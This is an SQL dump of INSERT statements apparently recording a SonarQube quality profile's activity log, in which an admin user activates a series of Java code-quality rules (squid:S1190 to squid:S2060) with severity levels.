INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3574, '2017-11-20 12:53:44.126', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1190;ruleKey=squid:S1190;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfdg-bbGRdfPp-rVa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3575, '2017-11-20 12:53:44.184', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1191;ruleKey=squid:S1191;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;param_Exclude=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfdh4bbGRdfPp-rVb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3576, '2017-11-20 12:53:44.239', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1192;ruleKey=squid:S1192;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;param_threshold=3;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdivbbGRdfPp-rVc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3577, '2017-11-20 12:53:44.301', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1193;ruleKey=squid:S1193;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdjtbbGRdfPp-rVd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3578, '2017-11-20 12:53:44.351', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1195;ruleKey=squid:S1195;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdkfbbGRdfPp-rVe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3579, '2017-11-20 12:53:44.387', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1197;ruleKey=squid:S1197;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdlDbbGRdfPp-rVf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3580, '2017-11-20 12:53:44.427', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1199;ruleKey=squid:S1199;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdlrbbGRdfPp-rVg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3581, '2017-11-20 12:53:44.467', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1201;ruleKey=squid:S1201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdmTbbGRdfPp-rVh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3582, '2017-11-20 12:53:44.53', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1206;ruleKey=squid:S1206;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdnSbbGRdfPp-rVi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3583, '2017-11-20 12:53:44.563', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1210;ruleKey=squid:S1210;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdnzbbGRdfPp-rVj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3584, '2017-11-20 12:53:44.587', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1214;ruleKey=squid:S1214;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdoLbbGRdfPp-rVk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3585, '2017-11-20 12:53:44.62', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1215;ruleKey=squid:S1215;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdosbbGRdfPp-rVl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3586, '2017-11-20 12:53:44.65', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1217;ruleKey=squid:S1217;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdpKbbGRdfPp-rVm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3587, '2017-11-20 12:53:44.681', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1219;ruleKey=squid:S1219;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdppbbGRdfPp-rVn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3588, '2017-11-20 12:53:44.702', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1220;ruleKey=squid:S1220;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfdp-bbGRdfPp-rVo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3589, '2017-11-20 12:53:44.733', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1221;ruleKey=squid:S1221;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdqdbbGRdfPp-rVp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3590, '2017-11-20 12:53:44.762', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1223;ruleKey=squid:S1223;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfdq6bbGRdfPp-rVq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3591, '2017-11-20 12:53:44.788', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1226;ruleKey=squid:S1226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdrUbbGRdfPp-rVr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3592, '2017-11-20 12:53:44.828', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1264;ruleKey=squid:S1264;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfdr8bbGRdfPp-rVs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3593, '2017-11-20 12:53:44.863', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S128;ruleKey=squid:S128;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdsfbbGRdfPp-rVt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3594, '2017-11-20 12:53:44.904', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1301;ruleKey=squid:S1301;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdtIbbGRdfPp-rVu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3595, '2017-11-20 12:53:44.952', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1313;ruleKey=squid:S1313;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfdt4bbGRdfPp-rVv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3596, '2017-11-20 12:53:45.005', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1317;ruleKey=squid:S1317;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdutbbGRdfPp-rVw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3597, '2017-11-20 12:53:45.058', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1319;ruleKey=squid:S1319;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdvibbGRdfPp-rVx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3598, '2017-11-20 12:53:45.183', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S135;ruleKey=squid:S135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdxfbbGRdfPp-rVy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3599, '2017-11-20 12:53:45.284', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1444;ruleKey=squid:S1444;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfdzEbbGRdfPp-rVz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3600, '2017-11-20 12:53:45.351', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1450;ruleKey=squid:S1450;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfd0HbbGRdfPp-rV0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3601, '2017-11-20 12:53:45.448', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1452;ruleKey=squid:S1452;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfd1obbGRdfPp-rV1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3602, '2017-11-20 12:53:45.517', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1479;ruleKey=squid:S1479;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;param_maximum=30;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfd2tbbGRdfPp-rV2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3603, '2017-11-20 12:53:45.543', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1481;ruleKey=squid:S1481;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfd3GbbGRdfPp-rV3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3604, '2017-11-20 12:53:45.567', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1488;ruleKey=squid:S1488;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfd3fbbGRdfPp-rV4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3605, '2017-11-20 12:53:45.606', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1596;ruleKey=squid:S1596;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfd4GbbGRdfPp-rV5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3606, '2017-11-20 12:53:45.654', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1598;ruleKey=squid:S1598;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfd42bbGRdfPp-rV6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3607, '2017-11-20 12:53:45.698', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1602;ruleKey=squid:S1602;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfd5ibbGRdfPp-rV7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3608, '2017-11-20 12:53:45.726', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1604;ruleKey=squid:S1604;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfd5-bbGRdfPp-rV8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3609, '2017-11-20 12:53:45.763', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1607;ruleKey=squid:S1607;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfd6jbbGRdfPp-rV9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3610, '2017-11-20 12:53:45.791', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1610;ruleKey=squid:S1610;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfd6_bbGRdfPp-rV-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3611, '2017-11-20 12:53:45.861', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1611;ruleKey=squid:S1611;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfd8FbbGRdfPp-rV_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3612, '2017-11-20 12:53:45.901', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1612;ruleKey=squid:S1612;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfd8tbbGRdfPp-rWA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3613, '2017-11-20 12:53:45.939', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1640;ruleKey=squid:S1640;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfd9TbbGRdfPp-rWB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3614, '2017-11-20 12:53:45.968', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1643;ruleKey=squid:S1643;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfd9wbbGRdfPp-rWC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3615, '2017-11-20 12:53:45.998', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1656;ruleKey=squid:S1656;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfd-ObbGRdfPp-rWD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3616, '2017-11-20 12:53:46.038', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1659;ruleKey=squid:S1659;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfd-2bbGRdfPp-rWE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3617, '2017-11-20 12:53:46.085', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1700;ruleKey=squid:S1700;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Zfd_lbbGRdfPp-rWF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3618, '2017-11-20 12:53:46.13', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1710;ruleKey=squid:S1710;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeASbbGRdfPp-rWG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3619, '2017-11-20 12:53:46.176', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1751;ruleKey=squid:S1751;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeBAbbGRdfPp-rWH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3620, '2017-11-20 12:53:46.216', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1764;ruleKey=squid:S1764;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeBobbGRdfPp-rWI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3621, '2017-11-20 12:53:46.255', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1844;ruleKey=squid:S1844;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeCPbbGRdfPp-rWJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3622, '2017-11-20 12:53:46.296', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1845;ruleKey=squid:S1845;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeC4bbGRdfPp-rWK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3623, '2017-11-20 12:53:46.328', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1849;ruleKey=squid:S1849;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeDYbbGRdfPp-rWL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3624, '2017-11-20 12:53:46.367', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1854;ruleKey=squid:S1854;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeD_bbGRdfPp-rWM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3625, '2017-11-20 12:53:46.41', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1858;ruleKey=squid:S1858;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeEqbbGRdfPp-rWN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3626, '2017-11-20 12:53:46.451', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1860;ruleKey=squid:S1860;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeFTbbGRdfPp-rWO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3627, '2017-11-20 12:53:46.492', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1862;ruleKey=squid:S1862;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeF8bbGRdfPp-rWP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3628, '2017-11-20 12:53:46.532', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1871;ruleKey=squid:S1871;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeGjbbGRdfPp-rWQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3629, '2017-11-20 12:53:46.574', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1872;ruleKey=squid:S1872;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeHObbGRdfPp-rWR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3630, '2017-11-20 12:53:46.611', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1905;ruleKey=squid:S1905;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeHzbbGRdfPp-rWS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3631, '2017-11-20 12:53:46.652', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1940;ruleKey=squid:S1940;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeIcbbGRdfPp-rWT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3632, '2017-11-20 12:53:46.696', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1948;ruleKey=squid:S1948;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeJIbbGRdfPp-rWU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3633, '2017-11-20 12:53:46.776', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1989;ruleKey=squid:S1989;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeKYbbGRdfPp-rWV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3634, '2017-11-20 12:53:46.82', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S1994;ruleKey=squid:S1994;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeLEbbGRdfPp-rWW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3635, '2017-11-20 12:53:46.863', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2055;ruleKey=squid:S2055;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeLvbbGRdfPp-rWX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3636, '2017-11-20 12:53:46.893', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534:squid:S2060;ruleKey=squid:S2060;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena_copy002-54534;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZfeMNbbGRdfPp-rWY');
